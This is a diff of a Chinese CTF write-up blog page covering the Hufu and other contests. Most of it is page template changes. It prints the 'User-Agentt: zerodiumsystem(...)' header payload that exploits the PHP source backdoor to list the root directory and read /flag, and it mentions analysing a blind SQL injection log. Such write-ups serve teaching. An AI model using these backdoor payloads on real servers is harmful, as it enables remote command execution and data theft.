@@ -1,92 +1,258 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/atkx_16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/atkx-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="摘要：记录最近几场比赛的赛后复现">
-<meta property="og:type" content="article">
-<meta property="og:title" content="虎符+红明谷+ctfshow渔人杯赛后复现">
-<meta property="og:url" content="https://swhat.github.io/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/index.html">
-<meta property="og:site_name" content="At的小站">
-<meta property="og:description" content="摘要：记录最近几场比赛的赛后复现">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404100847899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404100629750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404100940524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404101127186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404101326722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404103342703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210405165110827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404173216510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404173408667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404180245275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404180359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408214553555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404122728247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404123026959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404123102170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404125742649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404124738984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404131900210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404132911508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404133231967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404133052347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404134253711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404135014838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404135001556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404135103522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404135150921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210405171746862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210405172008540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021040414094950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404141133808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404141301883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404141503298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404142416970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021040414211853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404142546734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210404143008250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="article:published_time" content="2021-04-05T13:40:02.000Z">
-<meta property="article:modified_time" content="2021-08-15T03:59:06.619Z">
-<meta property="article:author" content="Atkx">
-<meta property="article:tag" content="Write up">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210404100847899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70"><title>虎符+红明谷+ctfshow渔人杯赛后复现 | At的小站</title><link ref="canonical" href="https://swhat.github.io/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
-var CONFIG = {
-  root: '/',
-  algolia: undefined,
-  assistSearch: undefined,
-  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
-  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
-  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
-  postWidget: {"endText":true},
-  nightMode: {"enable":true},
-  back2top: {"enable":true},
-  codeblock: {"style":"default","highlight":"light","wordWrap":false},
-  reward: false,
-  fancybox: false,
-  zoomImage: {"gapAside":"20px"},
-  galleryWaterfall: undefined,
-  lazyload: false,
-  pjax: undefined,
-  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
-  shortcuts: undefined,
-  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
-  sourcePath: {"js":"js","css":"css","images":"images"},
-};
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="At的小站" type="application/atom+xml">
-</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fas-folder-open"></i></span><span class="header-nav-menu-item__text">menu.links</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">At的小站</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">虎符+红明谷+ctfshow渔人杯赛后复现</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-04-05</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">1.7k</span></span></div></header><div class="post-body"><p>摘要：记录最近几场比赛的赛后复现</p>
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/atkx_16x16.png">
+  <link rel="icon" href="/img/atkx_16x16.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摘要：记录最近几场比赛的赛后复现">
+  <meta name="author" content="Atkx">
+  <meta name="keywords" content="">
+  
+  <title>虎符+红明谷+ctfshow渔人杯赛后复现 - At的小站</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"swhat.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="At的小站" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Atkx</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg_image2.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="虎符+红明谷+ctfshow渔人杯赛后复现">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-05 21:40" pubdate>
+        2021年4月5日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">虎符+红明谷+ctfshow渔人杯赛后复现</h1>
+            
+            <div class="markdown-body">
+              <p>摘要：记录最近几场比赛的赛后复现</p>
  <a id="more"></a>
 
-<h1 id="虎符CTF"><a href="#虎符CTF" class="headerlink" title="虎符CTF"></a>虎符CTF</h1><h2 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web-签到"></a>Web-签到</h2><p><img src="https://img-blog.csdnimg.cn/20210404100847899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/313267.html">详细分析PHP源代码后门事件及其供应链安全启示</a></p>
+<h1 id="虎符CTF"><a href="#虎符CTF" class="headerlink" title="虎符CTF"></a>虎符CTF</h1><h2 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web-签到"></a>Web-签到</h2><p><img src="https://img-blog.csdnimg.cn/20210404100847899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>参考<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/313267.html">详细分析PHP源代码后门事件及其供应链安全启示</a></p>
 <p>根据文章提示，添加恶意请求头</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumphpinfo();<br></code></pre></td></tr></table></figure>
-<p>可以看到phpinfo内容<br><img src="https://img-blog.csdnimg.cn/20210404100629750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续构造，查看根目录下的文件</p>
+<p>可以看到phpinfo内容<br><img src="https://img-blog.csdnimg.cn/20210404100629750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>继续构造，查看根目录下的文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210404100940524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读取flag文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210404100940524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>读取flag文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210404101127186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="MISC-你会日志分析吗"><a href="#MISC-你会日志分析吗" class="headerlink" title="MISC-你会日志分析吗"></a>MISC-你会日志分析吗</h2><p><img src="https://img-blog.csdnimg.cn/20210404101326722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析日志，该日志应该是用脚本进行布尔盲注，最后一步是爆flag的值，发现有两种长度的包，猜测长度377代表爆值成功，长度399代表失败<br><img src="https://img-blog.csdnimg.cn/20210404103342703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>列出长度为377的值</p>
+<p><img src="https://img-blog.csdnimg.cn/20210404101127186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="MISC-你会日志分析吗"><a href="#MISC-你会日志分析吗" class="headerlink" title="MISC-你会日志分析吗"></a>MISC-你会日志分析吗</h2><p><img src="https://img-blog.csdnimg.cn/20210404101326722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>分析日志，该日志应该是用脚本进行布尔盲注，最后一步是爆flag的值，发现有两种长度的包，猜测长度377代表爆值成功，长度399代表失败<br><img src="https://img-blog.csdnimg.cn/20210404103342703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>列出长度为377的值</p>
